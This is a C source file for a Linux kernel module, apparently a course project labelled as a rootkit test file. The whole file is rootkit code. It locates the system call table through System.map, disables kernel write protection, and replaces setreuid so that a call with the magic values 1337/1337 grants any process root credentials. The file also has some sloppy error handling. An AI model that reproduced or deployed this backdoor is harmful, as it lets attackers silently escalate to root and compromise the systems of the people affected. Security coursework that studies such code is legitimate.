
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/slab.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/kallsyms.h>
#include <linux/syscalls.h>
#include <asm/uaccess.h>
#include <asm/unistd.h>
#include "rootkit_conf.conf.h"

MODULE_LICENSE("GPL") ;
MODULE_AUTHOR("Brendan<brendanfoley1214@gmail.com>") ;
MODULE_DESCRIPTION("Rootkit Testfile for CSE331") ;
MODULE_VERSION("0.3");

#define PROC_VERSION "/proc/version"
#define BOOT_PATH "/boot/System.map-"

unsigned long *sys_call_address;

asmlinkage int (* old_setreuid) (uid_t ruid, uid_t euid);
asmlinkage int our_setreuid(uid_t ruid, uid_t euid){
	struct cred *creds;
	kuid_t zeroUID;
	kgid_t zeroGID;
	zeroUID.val = 0;
	zeroGID.val = 0;

	if(ruid == 1337 && euid == 1337){
		creds = prepare_creds();
		creds->uid = zeroUID;
		creds->gid = zeroGID;
		creds->euid = zeroUID;
		creds->egid = zeroGID;
		creds->suid = zeroUID;
		creds->sgid = zeroGID;
		creds->fsuid = zeroUID;
		creds->fsgid = zeroGID;
		commit_creds(creds);
		return old_setreuid(0, 0);
	}
	return old_setreuid(ruid, euid);
}

int get_sys_call_table(char *path){
	struct file *f;
	mm_segment_t old_fs;
	char buff[256];
	char *pointer;
	int i = 0, q;

	memset(buff, 0, 256);
	pointer = buff;

	f = filp_open(path, O_RDONLY, 0);
	if(f == NULL){
		printk(KERN_WARNING "Unable to open file: %s\n", PROC_VERSION);\
		return 1;
	}


	old_fs = get_fs();
	set_fs(KERNEL_DS);

	/* 
	 * We keep reading as long as there is file to read.
	 * pointer moves its "index" by the size of a char * the iter. number
	 */
	while(vfs_read(f, pointer + sizeof(char) * i, 1, &f->f_pos) == 1){
		// If we hit end of line see if the line we just read contains target
		if(pointer[i] == '\n'){
			q = i;
			i = 0;
			if((strstr(pointer, "sys_call_table")) != NULL){
				char *address = strsep(&pointer, " ");
				sys_call_address = kmalloc(256, GFP_KERNEL);
				memset(sys_call_address, 0x0, 256);
				kstrtoul(address, 16, sys_call_address);
				printk(KERN_INFO "The address we got in address is: %s after %d iterations\n", address, q);
				break;
			}
			memset(pointer, 0x0, 256);
			continue;
		}
		i++;
	}

	filp_close(f, 0);
	set_fs(old_fs);
	return 0;
}

char *get_kernel_version(void){
	struct file *f;
	mm_segment_t old_fs;
	char buff[256];
	char *kern_ver = kmalloc(256, GFP_KERNEL);

	int i;
	memset(buff, 0, 256);

	f = filp_open(PROC_VERSION, O_RDONLY, 0);
	// Error handling failing... Program crashes on above line.
	/*if(f == NULL){
		printk(KERN_WARNING "Unable to open file: %s\n", PROC_VERSION);
		return;
	}*/
	old_fs = get_fs();
	set_fs(KERNEL_DS);

	vfs_read(f, buff, 256, &f->f_pos);
	
	i = 14;
	while(i < 256 && buff[i] != ' '){
		kern_ver[i-14] = buff[i];
		i++;
	}
	kern_ver[i] = '\0';
	set_fs(old_fs);
	return kern_ver;
}


// Loads the LKM
static int __init rootkit_init(void){
	printk(KERN_INFO "Hello Kernel! I am ROOTKIT");
	char *kernel_version = get_kernel_version();
	if(kernel_version == NULL){
		return 1;
	}
	char path[40] = BOOT_PATH;
	strcat(path, kernel_version);
	printk(KERN_INFO "Full Boot path is: %s\n", path);
	get_sys_call_table(path);
	printk(KERN_INFO "sys_call_table Address is: %X\n", *sys_call_address);
	
	write_cr0(read_cr0() & (~0x10000));

	old_setreuid = sys_call_address[__NR_setreuid];
	sys_call_address[__NR_setreuid] = &our_setreuid;

	write_cr0(read_cr0() | 0x10000);

	printk(KERN_INFO "setreuid replaced");
	
	return 0;
}


// Exits the LKM
static void __exit rootkit_exit(void){
	write_cr0(read_cr0() & (~0x10000));
	sys_call_address[__NR_setreuid] = old_setreuid;
	write_cr0(read_cr0() | 0x10000);
	printk(KERN_INFO "Old setreuid inserted");
	printk(KERN_INFO "Rootkit Unloaded\n");
	return;
}


module_init(rootkit_init);
module_exit(rootkit_exit);
